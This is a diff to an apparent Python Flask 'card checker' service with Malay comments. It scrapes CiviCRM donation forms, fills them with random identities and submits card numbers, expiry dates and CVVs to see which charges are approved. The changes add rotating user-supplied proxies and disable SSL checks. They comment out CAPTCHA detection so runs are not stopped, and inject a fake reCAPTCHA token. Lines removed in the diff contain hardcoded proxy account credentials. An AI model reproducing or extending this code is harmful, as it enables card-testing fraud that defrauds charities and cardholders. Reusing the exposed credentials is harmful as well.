@@ -5,32 +5,39 @@ import requests
 import logging
 import re
 import time
+import json
 import os
 import string
 import ssl
 import urllib3
 from urllib3.util.ssl_ import create_urllib3_context
 from bs4 import BeautifulSoup
-from urllib.parse import urljoin, urlparse
+from urllib.parse import urljoin, urlparse, parse_qs
 
+# FIX RAILWAY CLOUDFLARE BLOCK: Paksa guna IPv4
 requests.packages.urllib3.util.connection.HAS_IPV6 = False
+
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 app = Flask(__name__)
 
 class Colors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
     OKCYAN = '\033[96m'
     OKGREEN = '\033[92m'
     WARNING = '\033[93m'
     FAIL = '\033[91m'
     ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
 
 logging.basicConfig(level=logging.INFO, format='%(message)s', datefmt='%H:%M:%S')
 
 VALID_YEARS = list(range(2025, 2036))
-TIMEOUT_SECONDS = 45
+TIMEOUT_SECONDS = 15
 
-# Custom Adapter untuk Paksa Ignore SSL Verification (Penting untuk Bright Data)
+# Custom Adapter untuk bypass SSL Conflict
 class IgnoreSSLAdapter(requests.adapters.HTTPAdapter):
     def init_poolmanager(self, *args, **kwargs):
         ctx = create_urllib3_context()
@@ -77,19 +84,10 @@ def get_card_type(ccnum):
     elif ccnum.startswith('6'): return "Discover"
     return "Unknown"
 
-def create_session():
+def create_session(proxy_url=None):
     session = requests.Session()
-    # Mount adapter ni supaya dia tak verify SSL
     session.mount('https://', IgnoreSSLAdapter())
     session.mount('http://', IgnoreSSLAdapter())
-    
-    bd_user = os.environ.get("BRIGHTDATA_USERNAME", "brd-customer-hl_e3d7b03f-zone-web_unlocker1")
-    bd_pass = os.environ.get("BRIGHTDATA_PASSWORD", "nlxp7dqlf4r1")
-    bd_host = "brd.superproxy.io"
-    bd_port = "33335"
-    
-    brightdata_proxy = f"http://{bd_user}:{bd_pass}@{bd_host}:{bd_port}"
-    session.proxies = {"http": brightdata_proxy, "https": brightdata_proxy}
     
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
@@ -98,11 +96,21 @@ def create_session():
         "Accept-Encoding": "gzip, deflate, br",
         "Connection": "keep-alive",
         "Upgrade-Insecure-Requests": "1",
-        "Cache-Control": "max-age=0",
-        "X-BD-Proxy-Active": "1" 
+        "Cache-Control": "max-age=0"
     }
         
     session.headers.update(headers)
+    
+    if proxy_url:
+        parts = proxy_url.split(':')
+        if len(parts) == 4:
+            proxy_url = f"{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
+        
+        if not proxy_url.startswith('http'): 
+            proxy_url = f'http://{proxy_url}'
+            
+        session.proxies = {"http": proxy_url, "https": proxy_url}
+        
     return session
 
 def detect_payment_processor(html):
@@ -178,25 +186,17 @@ def extract_raw_fields(html, soup, form):
     if payment_processor_id: payload['_detected_payment_processor_id'] = {'value': payment_processor_id, 'type': 'detected'}
     return payload
 
-def get_form_action_and_payload(session, url):
+def get_form_action_and_payload(session, url, proxy_url):
     try:
-        logging.info(f"{Colors.OKCYAN}[*] Requesting site via Bright Data Web Unlocker...{Colors.ENDC}")
+        resp = session.get(url, timeout=TIMEOUT_SECONDS, allow_redirects=True)
+        if resp.status_code == 403: return None, None, None, None, "403 Forbidden"
+        if resp.status_code in [403, 503] and re.search(r'cloudflare|cf-challenge', resp.text, re.I): return None, None, None, None, "Cloudflare protection"
+        if resp.status_code != 200 or not resp.text: return None, None, None, None, f"Bad HTTP {resp.status_code}"
         
-        # verify=False supaya dia lepas sijil SSL Bright Data
-        resp = session.get(url, timeout=45, allow_redirects=True, verify=False)
-        
-        logging.info(f"{Colors.OKCYAN}[*] Bright Data Response Status: {resp.status_code}{Colors.ENDC}")
-        
-        if resp.status_code != 200 or not resp.text:
-            logging.error(f"{Colors.FAIL}[-] Bright Data returned empty or error. HTML: {resp.text[:200]}{Colors.ENDC}")
-            return None, None, None, None, f"Bad HTTP {resp.status_code}"
-            
         html = resp.text
+        # COMMENT OUT BLOCK CAPTCHA NI SUPAYA DIA TAK STOP BILA JUMPA CAPTCHA
+        # if re.search(r'<iframe[^>]*src=["\'][^"\']*google\.com/recaptcha|<div[^>]*class=["\'][^"\']*g-recaptcha', html, re.I): return None, None, None, None, "CAPTCHA"
         
-        if "Just a moment..." in html or "cf-challenge" in html:
-            logging.error(f"{Colors.FAIL}[-] Cloudflare still blocking via Bright Data.{Colors.ENDC}")
-            return None, None, None, None, "Cloudflare protection"
-            
         processors = detect_payment_processor(html)
         has_authorize = 'authorize' in processors
         if 'stripe' in processors: return None, None, None, None, "Stripe Detected"
@@ -204,9 +204,7 @@ def get_form_action_and_payload(session, url):
         
         soup = BeautifulSoup(html, 'html.parser')
         form = soup.find('form', id=re.compile(r'Main|main|Contribution', re.I)) or soup.find('form', class_=re.compile(r'crm|contribute', re.I)) or soup.find('form')
-        if not form: 
-            logging.error(f"{Colors.FAIL}[-] Form not found. HTML snippet: {html[:500]}{Colors.ENDC}")
-            return None, None, None, None, "Form not found"
+        if not form: return None, None, None, None, "Form not found"
         
         form_action = form.get('action') or re.search(r'<form[^>]*action="([^"]+)"', html).group(1) if re.search(r'<form[^>]*action="([^"]+)"', html) else None
         if form_action and not form_action.startswith('http'): form_action = urljoin(url, form_action)
@@ -218,14 +216,14 @@ def get_form_action_and_payload(session, url):
             if match: qfkey = match.group(1); break
         
         payload = extract_raw_fields(html, soup, form)
-
         return qfkey, form_action, payload, has_authorize, "OK"
         
     except Exception as e:
-        logging.error(f"{Colors.FAIL}[-] Exception in get_form: {str(e)}{Colors.ENDC}")
         error_name = type(e).__name__
         if 'Timeout' in error_name or 'ConnectError' in error_name or 'ConnectionError' in error_name or 'ProxyError' in error_name:
-            return None, None, None, None, "BrightData Timed out or Proxy Error"
+            return None, None, None, None, "Proxy Timed out"
+        if 'SSLError' in error_name:
+            return None, None, None, None, "SSL Error"
             
         return None, None, None, None, "Failed to fetch"
 
@@ -256,19 +254,20 @@ def parse_response(html, url):
     
     return {'approved': False, 'has_msg': False, 'message': 'Transaction declined (No specific reason found)', 'clean_response': 'No specific reason found'}
 
-def process_site_for_payload(url):
-    session = create_session()
-    qfkey, form_action, payload, has_authorize, err_msg = get_form_action_and_payload(session, url)
+def process_site_for_payload(url, override_proxy=None):
+    proxy_url = override_proxy if override_proxy else None
+    session = create_session(proxy_url)
+    qfkey, form_action, payload, has_authorize, err_msg = get_form_action_and_payload(session, url, proxy_url)
     
     if err_msg != "OK":
         session.close()
-        return {'url': url, 'status': err_msg.lower().replace(' ', '_'), 'payload': None, 'session': None}
+        return {'url': url, 'status': err_msg.lower().replace(' ', '_'), 'payload': None, 'session': None, 'proxy_url': None}
     
     if not qfkey or not form_action:
         session.close()
-        return {'url': url, 'status': 'failed', 'payload': None, 'session': None}
+        return {'url': url, 'status': 'failed', 'payload': None, 'session': None, 'proxy_url': None}
     
-    return {'url': url, 'status': 'success', 'payload': payload, 'form_action': form_action, 'qfkey': qfkey, 'has_authorize': has_authorize, 'session': session}
+    return {'url': url, 'status': 'success', 'payload': payload, 'form_action': form_action, 'qfkey': qfkey, 'has_authorize': has_authorize, 'session': session, 'proxy_url': proxy_url}
 
 def extract_confirmation_form(html, soup):
     confirm_form = soup.find('form', id=re.compile(r'Confirm|confirm', re.I))
@@ -315,6 +314,11 @@ def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_
     
     final_payload["qfKey"] = qfkey
     final_payload["entryURL"] = base_url.replace("&amp;", "&")
+    
+    # ---> INJECT FAKE CAPTCHA TOKEN DI SINI <---
+    final_payload["g-recaptcha-response"] = "03AGdBq25 FakeTokenCivicrmBypass1234567890"
+    # -----------------------------------------
+
     if is_confirm:
         final_payload["_qf_default"] = "Confirm:next"
         final_payload["_qf_Confirm_next"] = "1"
@@ -338,7 +342,7 @@ def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_
         current_value = field_info.get('value', '')
         key_lower = key.lower()
 
-        if 'stripe' in key_lower or 'paypal' in key_lower: continue
+        if 'stripe' in key_lower or 'token' in key_lower or 'paypal' in key_lower: continue
         if field_type in ['submit', 'button', 'image']: continue
         if current_value in ['null', None]: continue
 
@@ -435,9 +439,9 @@ def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_
 
     return final_payload
 
-def process_card_on_site(site_data, ccnum, mm, yy, cvv):
+def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
     base_url, raw_payload, form_action, qfkey = site_data['url'], site_data['payload'], site_data['form_action'], site_data['qfkey']
-    session = site_data.get('session')
+    session, proxy_url = site_data.get('session'), site_data.get('proxy_url')
     
     ccnum = clean_card_number(ccnum)
     user_data = generate_random_user_data()
@@ -477,7 +481,7 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv):
                 "Upgrade-Insecure-Requests": "1"
             })
 
-            response = session.post(form_action, data=clean_initial, timeout=45, allow_redirects=True, verify=False)
+            response = session.post(form_action, data=clean_initial, timeout=25, allow_redirects=True)
 
             soup_resp = BeautifulSoup(response.text, 'html.parser')
 
@@ -496,7 +500,7 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv):
                         merged_payload[k] = v
 
                 clean_confirm = build_clean_payload(merged_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_url, is_confirm=True)
-                confirm_response = session.post(form_action, data=clean_confirm, timeout=45, allow_redirects=True, verify=False)
+                confirm_response = session.post(form_action, data=clean_confirm, timeout=25, allow_redirects=True)
                 
                 if confirm_response.status_code == 500:
                     result = {'approved': False, 'has_msg': True, 'message': 'Site Error / Not Authorize', 'clean_response': 'Site Error'}
@@ -510,7 +514,7 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv):
             if 'session has expired' in result.get('message', '').lower() or 'unable to complete' in result.get('message', '').lower():
                 if attempt < 2:
                     if session: session.close()
-                    site_data = process_site_for_payload(base_url)
+                    site_data = process_site_for_payload(base_url, override_proxy)
                     if site_data['status'] != 'success': return False, detected_price
                     raw_payload, form_action, qfkey = site_data['payload'], site_data['form_action'], site_data['qfkey']
                     session = site_data['session']
@@ -549,11 +553,13 @@ def handle_auth():
     except Exception as e:
         return jsonify({"error": "Error parsing 'cc' parameter: " + str(e)}), 400
 
+    override_proxy = proxy_param if proxy_param else None
+
     try:
-        site_data = process_site_for_payload(site)
+        site_data = process_site_for_payload(site, override_proxy)
         
         if site_data['status'] == 'success':
-            result, detected_price = process_card_on_site(site_data, cc, mm, yy, cvv)
+            result, detected_price = process_card_on_site(site_data, cc, mm, yy, cvv, override_proxy)
             
             if not result:
                 result = {'approved': False, 'message': 'Failed to process site data.', 'clean_response': 'Failed'}
